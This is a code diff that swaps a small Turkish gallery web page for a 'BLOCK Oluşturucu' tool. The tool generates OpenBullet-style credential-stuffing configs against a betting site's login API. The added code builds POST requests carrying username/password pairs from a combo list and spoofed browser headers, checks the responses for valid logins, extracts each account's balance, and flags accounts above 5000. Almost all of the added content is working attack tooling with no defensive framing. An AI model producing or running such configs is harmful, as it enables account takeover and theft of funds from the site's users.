@@ -1,129 +1,70 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOVA | Creative Gallery</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
-    <style>
-        body {
-            background: linear-gradient(to right bottom, #1a1a1a, #2d2d2d);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        .gallery-container {
-            max-width: 1400px;
-            margin: 2rem auto;
-            padding: 20px;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-        }
-
-        .gallery-item {
-            position: relative;
-            border-radius: 15px;
-            overflow: hidden;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .gallery-item:hover {
-            transform: translateY(-5px) scale(1.02);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-        }
-
-        .gallery-item img {
-            width: 100%;
-            height: 300px;
-            object-fit: cover;
-        }
-
-        /* Special Video Styling */
-        .video-wrapper {
-            position: relative;
-            grid-column: span 2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 20px;
-            box-shadow: 0 8px 32px rgba(255, 255, 255, 0.2);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); }
-            50% { box-shadow: 0 0 30px rgba(255, 255, 255, 0.4); }
-            100% { box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); }
-        }
-
-        video {
-            width: 100%;
-            max-width: 600px;
-            border-radius: 15px;
-            outline: 3px solid white;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>BLOCK Oluşturucu</title>
+  <style>
+    body { font-family: Arial; padding: 20px; background: #f9f9f9; }
+    input, textarea { width: 100%; padding: 10px; margin: 10px 0; }
+    button { padding: 10px 20px; background-color: #0066cc; color: white; border: none; cursor: pointer; }
+    pre { background: #eee; padding: 10px; white-space: pre-wrap; }
+  </style>
 </head>
 <body>
-    <div class="gallery-container" id="galleryGrid"></div>
 
-    <script>
-        const images = [
-            'https://i.pinimg.com/736x/7f/ef/30/7fef30560b45d081364f9c8322ead700.jpg',
-            'https://i.pinimg.com/736x/f7/24/21/f72421427498195d281a89eb1854fdd5.jpg',
-            'https://i.pinimg.com/736x/f3/4b/d4/f34bd42ad5b88ee8e7078d9e1234f8cd.jpg',
-            'https://i.pinimg.com/736x/c5/e2/a3/c5e2a3a89383f14b907401f6174cbe2f.jpg'
-        ];
-        
-        const videoUrl = "https://cdn.discordapp.com/attachments/1297631248507736085/1337976614667026607/Sana_bugune_kadar_bir_tek_seye_olmaz._Yapamam_dedim_mi_.mp4?ex=67a96753&is=67a815d3&hm=db443b0b529c3d35e9c8cc8ec0fe92e792e6c91fe17e28c9f696b5c69c031ea9&";
-        
-        function initializeGallery() {
-            const galleryGrid = document.getElementById('galleryGrid');
-            
-            images.slice(0, Math.ceil(images.length / 2)).forEach(img => {
-                const item = document.createElement('div');
-                item.className = 'gallery-item';
-                
-                const image = document.createElement('img');
-                image.src = img;
-                
-                item.appendChild(image);
-                galleryGrid.appendChild(item);
-            });
+<h2>BLOCK Yapısı Oluştur</h2>
 
-            const videoWrapper = document.createElement('div');
-            videoWrapper.className = 'video-wrapper';
-            
-            const video = document.createElement('video');
-            video.src = videoUrl;
-            video.controls = true;
-            video.autoplay = false;
+<label>URL:</label>
+<input type="text" id="url" placeholder="https://favoribahis587.com/odin/api/user/login">
 
-            videoWrapper.appendChild(video);
-            galleryGrid.appendChild(videoWrapper);
+<label>Finger Print:</label>
+<input type="text" id="fingerprint" placeholder="af6a6b4ccb3e1d3cc09d4f68b1a489c0">
 
-            images.slice(Math.ceil(images.length / 2)).forEach(img => {
-                const item = document.createElement('div');
-                item.className = 'gallery-item';
-                
-                const image = document.createElement('img');
-                image.src = img;
-                
-                item.appendChild(image);
-                galleryGrid.appendChild(item);
-            });
-        }
-        
-        initializeGallery();
-    </script>
+<button onclick="generateBlock()">BLOCK OLUŞTUR</button>
+
+<h3>Çıktı:</h3>
+<pre id="output"></pre>
+
+<script>
+function generateBlock() {
+  const url = document.getElementById("url").value;
+  const fingerprint = document.getElementById("fingerprint").value;
+
+  const block = `BLOCK:HttpRequest
+  url = "${url}"
+  method = POST
+  customHeaders = {("content-type", "application/json"), ("finger_print", "${fingerprint}"), ("origin", "https://favoribahis587.com"), ("priority", "u=1, i"), ("referer", "https://favoribahis587.com/tr"), ("sec-ch-ua", "\\"Google Chrome\\";v=\\"135\\", \\"Not-A.Brand\\";v=\\"8\\", \\"Chromium\\";v=\\"135\\""), ("sec-ch-ua-mobile", "?0"), ("sec-ch-ua-platform", "\\"Windows\\""), ("sec-fetch-dest", "empty"), ("sec-fetch-mode", "cors"), ("sec-fetch-site", "same-origin"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36")}
+  TYPE:STANDARD
+  $\`{"requestBody":{"username":"<input.USER>","email":null,"phone":null,"keepLoggedIn":null,"password":"<input.PASS>","loginType":1,"fingerPrint":"${fingerprint}"},"languageId":1,"device":"d"}\`
+  "application/json"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "INVALID_USERNAME_OR_PASSWORD"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "responseKey\":\"SUCCESS\",\""
+ENDBLOCK
+
+BLOCK:Parse
+  input = @data.SOURCE
+  leftDelim = "\\"balance\\":"
+  rightDelim = ",\\""
+  MODE:LR
+  => CAP @Bakiye
+ENDBLOCK
+
+BLOCK:Keycheck
+  banIfNoMatch = False
+  KEYCHAIN CUSTOM OR
+    FLOATKEY @Bakiye LessThan 5000
+  KEYCHAIN SUCCESS OR
+    FLOATKEY @Bakiye GreaterThan 5000
+ENDBLOCK`;
+
+  document.getElementById("output").textContent = block;
+}
+</script>
+
 </body>
 </html>
